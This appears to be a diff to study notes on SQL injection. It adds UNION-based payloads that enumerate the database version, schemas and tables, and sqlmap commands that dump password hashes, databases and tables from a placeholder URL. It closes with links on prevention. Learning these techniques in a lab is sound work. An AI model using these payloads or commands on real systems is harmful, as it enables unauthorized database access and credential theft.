@@ -9,7 +9,7 @@ sql injection:
 https://portswigger.net/web-security/sql-injection/examining-the-database
 https://portswigger.net/web-security/sql-injection/union-attacks
 
-' UNION SELECT @@version, null, null; '
+' UNION SELECT @@version, null, null '
 ' UNION SELECT @@version, null, null; #'
 ' UNION SELECT TABLE_SCHEMA,TABLE_NAME, null FROM information_schema.tables; #'
 ' UNION SELECT TABLE_SCHEMA,TABLE_NAME, null FROM information_schema.tables where TABLE_SCHEMA='sql_injection'; #'
@@ -22,12 +22,24 @@ https://portswigger.net/web-security/sql-injection/union-attacks
 ***********
 sqlmap.org
 
+$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+
+GET
 $ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch
 $ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --banner
 $ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --passwords
 $ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --dbs
 $ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --tables -D [database]
 $ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --dump -T [table] -D [database] 
+
+POST
+[TODO]
+
+***********
+
+Zer egin konpontzeko?
+https://www.ptsecurity.com/ww-en/analytics/knowledge-base/how-to-prevent-sql-injection-attacks/
+https://stackoverflow.com/questions/60174/how-can-i-prevent-sql-injection-in-php
 
 */
 
